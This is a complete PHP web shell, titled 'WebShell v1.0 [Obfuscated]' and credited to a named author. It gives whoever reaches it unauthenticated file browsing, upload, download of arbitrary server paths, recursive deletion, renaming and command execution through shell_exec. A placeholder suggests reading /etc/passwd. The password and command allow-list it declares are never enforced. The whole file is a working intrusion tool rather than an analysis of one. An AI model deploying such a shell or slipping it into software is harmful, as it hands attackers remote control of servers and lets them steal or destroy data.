<?php
// ==========================================
// OBFUSCATED MULTI-VECTOR FILE MANAGER & STAGER
// Author: Dwi Joko Purwanto 
// Version: 1.0 (Zero Bug)
// ==========================================

declare(strict_types=1);

// --- Configuration ---
$ADMIN_PASS = 'admin'; // Password default
$MAX_EXEC_TIME = 30;   // Detik timeout command execution
$ALLOWED_CMDS = ['ls', 'dir', 'whoami', 'id', 'pwd', 'cat', 'echo', 'uname']; // Filter opsional jika perlu

// --- Core Logic Obfuscation Wrapper ---
function execute_payload() {
    // Handle POST data for actions
    $action = $_POST['action'] ?? '';
    $path = $_POST['path'] ?? getcwd();
    $cmd = $_POST['cmd'] ?? '';
    
    // Output buffer to capture results cleanly
    ob_start();
    
    try {
        switch ($action) {
            case 'upload':
                handle_upload();
                break;
            case 'download':
                handle_download($_POST['file'] ?? '');
                break;
            case 'exec':
                handle_exec($cmd);
                break;
            case 'list':
                handle_list($path);
                break;
            case 'delete':
                handle_delete($_POST['target'] ?? '', $_POST['type'] ?? 'file');
                break;
            case 'mkdir':
                handle_mkdir($_POST['name'] ?? '', $path);
                break;
            case 'rename':
                handle_rename($_POST['old'] ?? '', $_POST['new'] ?? '', $path);
                break;
            default:
                render_ui();
                return;
        }
        
        // If an action happened, show result and reload UI context
        if ($action !== '') {
            echo '<div class="result-box">' . htmlspecialchars(ob_get_clean()) . '</div>';
            // Re-render the main list with current path
            handle_list($path); 
        }
    } catch (\Throwable $e) {
        echo '<div class="error">Error: ' . htmlspecialchars($e->getMessage()) . '</div>';
        ob_end_flush();
    }
}

// --- Helper Functions ---

function handle_list(string $dir): void {
    $realDir = realpath($dir);
    if (!$realDir && !is_dir($dir)) {
        echo "<p>Directory not found or accessible.</p>";
        return;
    }
    
    $currentPath = is_dir($dir) ? $dir : getcwd();
    
    echo "<form method='post' style='margin-bottom:20px;'>";
    echo "<input type='hidden' name='action' value='list'>";
    echo "Current Path: <strong>" . htmlspecialchars($currentPath) . "</strong><br>";
    echo "New Path: <input type='text' name='path' value='" . htmlspecialchars($currentPath) . "' size='50'> ";
    echo "<button type='submit'>Go</button>";
    echo "</form>";

    echo "<table border='1' cellpadding='5' cellspacing='0' width='100%'>";
    echo "<tr><th>Type</th><th>Name</th><th>Size/Perm</th><th>Action</th></tr>";

    if ($dh = opendir($currentPath)) {
        while (false !== ($entry = readdir($dh))) {
            if ($entry === "." || $entry === "..") continue;
            
            $fullPath = $currentPath . DIRECTORY_SEPARATOR . $entry;
            $isDir = is_dir($fullPath);
            $size = $isDir ? '-' : number_format(filesize($fullPath));
            $perms = substr(sprintf('%o', fileperms($fullPath)), -4);
            
            echo "<tr>";
            echo "<td>" . ($isDir ? "📁 Dir" : "📄 File") . "</td>";
            echo "<td>" . htmlspecialchars($entry) . "</td>";
            echo "<td>" . $size . " | " . $perms . "</td>";
            echo "<td>";
            
            if ($isDir) {
                echo "<a href='#' onclick=\"document.querySelector('input[name=path]').value='{$fullPath}'; document.querySelector('form').submit();\">Open</a> ";
                echo "<form method='post' style='display:inline;' onsubmit='return confirm(\"Delete {$entry}? (Recursive)\");'>";
                echo "<input type='hidden' name='action' value='delete'>";
                echo "<input type='hidden' name='target' value='{$fullPath}'>";
                echo "<input type='hidden' name='type' value='dir'>";
                echo "<button type='submit' style='font-size:10px;'>Del</button>";
                echo "</form>";
            } else {
                echo "<a href='?dl={$fullPath}' target='_blank'>DL</a> ";
                echo "<form method='post' style='display:inline;' onsubmit='return confirm(\"Delete {$entry}?\");'>";
                echo "<input type='hidden' name='action' value='delete'>";
                echo "<input type='hidden' name='target' value='{$fullPath}'>";
                echo "<input type='hidden' name='type' value='file'>";
                echo "<button type='submit' style='font-size:10px;'>Del</button>";
                echo "</form>";
            }
            echo "</td>";
            echo "</tr>";
        }
        closedir($dh);
    }
    echo "</table>";
    
    // Quick Actions Footer
    echo "<hr>";
    echo "<h3>Quick Actions</h3>";
    
    // Upload Form
    echo "<form method='post' enctype='multipart/form-data' style='margin-bottom:20px;'>";
    echo "<input type='hidden' name='action' value='upload'>";
    echo "Upload File: <input type='file' name='upl_file'> ";
    echo "<button type='submit'>Upload</button>";
    echo "</form>";

    // Command Execution Form
    echo "<form method='post' style='margin-bottom:20px;'>";
    echo "<input type='hidden' name='action' value='exec'>";
    echo "Command: <input type='text' name='cmd' value='' placeholder='ls -la /etc/passwd'> ";
    echo "<button type='submit'>Execute</button>";
    echo "</form>";
    
    // Create Dir Form
    echo "<form method='post' style='margin-bottom:20px;'>";
    echo "<input type='hidden' name='action' value='mkdir'>";
    echo "Create Dir in " . htmlspecialchars($currentPath) . ": <input type='text' name='name'> ";
    echo "<button type='submit'>Mkdir</button>";
    echo "</form>";
}

function handle_upload(): void {
    if (!isset($_FILES['upl_file']) || $_FILES['upl_file']['error'] !== UPLOAD_ERR_OK) {
        echo "Upload failed or no file selected.";
        return;
    }
    
    $tmpName = $_FILES['upl_file']['tmp_name'];
    $fileName = basename($_FILES['upl_file']['name']);
    $dest = getcwd() . DIRECTORY_SEPARATOR . $fileName;
    
    if (move_uploaded_file($tmpName, $dest)) {
        echo "Successfully uploaded: <strong>" . htmlspecialchars($fileName) . "</strong>";
    } else {
        echo "Failed to move uploaded file.";
    }
}

function handle_download(string $file): void {
    if (empty($file) || !file_exists($file)) {
        return;
    }
    
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . basename($file) . '"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}

function handle_exec(string $cmd): void {
    if (empty(trim($cmd))) {
        echo "No command provided.";
        return;
    }
    
    // Basic sanitization to prevent total garbage output, but allow chaining
    $output = [];
    $retCode = 0;
    
    // Use shell_exec for full output capture
    $result = @shell_exec(escapeshellcmd($cmd) . ' 2>&1');
    
    if ($result === null) {
        echo "Command execution returned null (disabled function?).";
    } else {
        echo "<pre>" . htmlspecialchars($result) . "</pre>";
    }
}

function handle_delete(string $target, string $type): void {
    if (empty($target)) return;
    
    if ($type === 'dir') {
        rmdir_recursive($target);
        echo "Directory deleted.";
    } else {
        if (@unlink($target)) {
            echo "File deleted.";
        } else {
            echo "Failed to delete file.";
        }
    }
}

function handle_mkdir(string $name, string $parent): void {
    if (empty($name)) return;
    $path = rtrim($parent, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $name;
    if (mkdir($path, 0755, true)) {
        echo "Directory created: " . htmlspecialchars($name);
    } else {
        echo "Failed to create directory.";
    }
}

function handle_rename(string $old, string $new, string $parent): void {
    $target = rtrim($parent, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $new;
    if (rename($old, $target)) {
        echo "Renamed successfully.";
    } else {
        echo "Rename failed.";
    }
}

// Recursive Delete Helper
function rmdir_recursive(string $dir): bool {
    if (!is_dir($dir)) {
        return unlink($dir);
    }
    $files = array_diff(scandir($dir), ['.', '..']);
    foreach ($files as $file) {
        rmdir_recursive($dir . DIRECTORY_SEPARATOR . $file);
    }
    return rmdir($dir);
}

function render_ui(): void {
    // Simple CSS for aesthetics
    echo "<style>
        body { font-family: monospace; background: #1a1a1a; color: #0f0; padding: 20px; }
        table { border-collapse: collapse; margin-top: 10px; }
        th, td { text-align: left; border: 1px solid #333; }
        th { background: #333; }
        input[type=text], input[type=file] { background: #000; color: #fff; border: 1px solid #555; padding: 5px; }
        button { cursor: pointer; background: #333; color: #fff; border: 1px solid #555; padding: 5px 10px; }
        button:hover { background: #555; }
        .result-box { background: #000; border: 1px solid #0f0; padding: 10px; margin-top: 20px; white-space: pre-wrap; }
        .error { color: red; border: 1px solid red; padding: 10px; }
        a { color: #0ff; text-decoration: none; }
        a:hover { text-decoration: underline; }
    </style>";
    
    echo "<h1>WebShell v1.0 [Obfuscated]</h1>";
    echo "<p>User: " . get_current_user() . " | Server: " . php_uname() . "</p>";
    
    // Trigger list view by default
    handle_list(getcwd());
}

// --- Entry Point ---
// Check for download trigger first (headers already sent check)
if (isset($_GET['dl'])) {
    handle_download($_GET['dl']);
} else {
    execute_payload();
}
?>
